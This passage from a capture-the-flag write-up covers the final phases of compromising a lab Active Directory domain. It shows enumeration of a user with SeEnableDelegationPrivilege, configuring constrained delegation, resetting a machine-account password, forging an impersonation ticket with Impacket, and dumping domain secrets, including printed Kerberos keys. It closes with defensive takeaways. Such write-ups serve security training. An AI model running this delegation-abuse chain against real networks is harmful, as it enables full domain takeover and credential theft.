evil-winrm-py PS C:\Users\Helen.Frost\Desktop> tasklist
ERROR: Access denied
System.Management.Automation.RemoteException
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc
   Primary Dns Suffix  . . . . . . . : redelegate.vl
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : redelegate.vl
                                       .htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-07-19
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::7153:19bd:ba81:2f49(Preferred)
   Link-local IPv6 Address . . . . . : fe80::fadf:1792:8597:3c3a%6(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.234.50(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Wednesday, November 26, 2025 7:40:59 PM
   Lease Expires . . . . . . . . . . : Wednesday, November 26, 2025 10:10:58 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%6
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 385896534
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-30-B9-80-A1-00-50-56-B9-07-19
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
evil-winrm-py PS C:\Users\Helen.Frost\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes                           
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                         


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
evil-winrm-py PS C:\Users\Helen.Frost\Desktop>

```

**Findings:** `Helen.Frost` had `SeEnableDelegationPrivilege` and was a member of the `IT` group.

### Phase 9: Constrained Delegation Configuration

**21. Configure Delegation for FS01$**  
Using PowerShell, the `FS01$` computer account was configured for constrained delegation.

```bash 
evil-winrm-py PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
evil-winrm-py PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegate
To"="ldap/dc.redelegate.vl"}
evil-winrm-py PS C:\Users\Helen.Frost\Documents>

```

**22. Password Reset for FS01$**  
The password for the `FS01$` machine account was reset.

```bash 
❯ uv run ./nxc/netexec.py smb dc.redelegate.vl -u Helen.Frost -p 'Password123'  -M change-password -o USER='FS01$' NEWPASS=Password123
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.49ms
Installed 1 package in 1ms
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Helen.Frost:Password123
CHANGE-P... 10.129.234.50   445    DC               [+] Successfully changed password for FS01$

 /opt/NetExec  main !1 ?1      
```

### Phase 10: Delegation Attack

**23. Service Ticket Request**  
Using the `FS01$` account, a service ticket was requested to impersonate the `DC$` account.

```bash 
❯ getST.py 'redelegate.vl/FS01$:Password123' -spn ldap/dc.redelegate.vl -impersonate dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache

 /home/h/HTB/C/Redelegate              
```

### Phase 11: Domain Compromise

**24. Secretsdump with Kerberos**  
Using the obtained delegation ticket, secretsdump was used to extract all domain hashes.

```bash 
❯ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
❯ secretsdump.py -k -no-pass dc.redelegate.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
Christine.Flanders:des-cbc-md5:8980267623df2637
Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
Marie.Curie:des-cbc-md5:256889c8bf678910
Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
Michael.Pontiac:des-cbc-md5:833dc82fab76c229
Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
Mallory.Roberts:des-cbc-md5:cb25a726ae198686
James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
sql_svc:des-cbc-md5:970d6115d3f4a43b
DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
DC$:des-cbc-md5:3db913751c434f61
[*] Cleaning up...

 /home/honeypoop/HTB/CPTS-Prep/Redeleg
```
**Findings:** The NT hash for the `Administrator` account was obtained: `<REDACTED_ADMIN_HASH>`.

**25. Domain Administrator Access**  
With the Administrator hash, full domain compromise was achieved.

### Phase 12: Root Flag Retrieval

**26. Root Flag**  
The root flag was retrieved from the Administrator's desktop.

```powershell
cd C:\Users\Administrator\Desktop
cat root.txt
```

**Findings:** The root flag was successfully retrieved: `<REDACTED_ROOT_FLAG>`.

## Key Takeaways

- **Anonymous FTP Risks:** Publicly accessible FTP servers can expose sensitive files like password databases and audit documents.
    
- **Password Patterns:** Seasonal password patterns (e.g., "Fall2024!") are easily guessable and should be avoided.
    
- **Credential Reuse:** Password reuse across services (KeePass, MSSQL, domain accounts) enables lateral movement.
    
- **MSSQL UNC Path Injection:** The `xp_dirtree` procedure can be abused to capture NTLM hashes for offline cracking.
    
- **ACL Abuse:** `User-Force-Change-Password` privileges allow account takeovers and should be tightly controlled.
    
- **SeEnableDelegationPrivilege:** This powerful privilege allows configuring delegation and should be restricted to trusted administrators.
    
- **Constrained Delegation:** Misconfigured delegation can be abused to impersonate privileged accounts and compromise the domain.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
